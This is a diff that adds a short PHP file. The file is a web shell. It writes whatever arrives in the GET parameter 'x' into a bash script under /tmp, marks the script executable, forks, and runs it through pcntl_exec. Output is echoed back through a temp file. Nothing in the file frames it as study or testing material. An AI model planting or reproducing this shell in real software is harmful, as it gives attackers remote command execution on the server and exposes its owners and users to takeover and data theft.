@@ -1,0 +1,29 @@
+<?php
+
+header("Content-Type: text/plain");
+
+$cmd="/tmp/exec";
+@unlink($cmd);
+$c = "#!/usr/bin/env bash\n".$_GET[x]."> /tmp/output.txt\n";
+file_put_contents($cmd, $c);
+chmod($cmd, 0777);
+$cd="/tmp/output.txt";
+print_r(file_get_contents($cd));
+
+
+switch (pcntl_fork()) {
+
+  case 0:
+
+    $ret = pcntl_exec($cmd);
+
+    exit("case 0");
+
+  default:
+
+    echo "case 1";
+
+    break;
+
+}
+?>
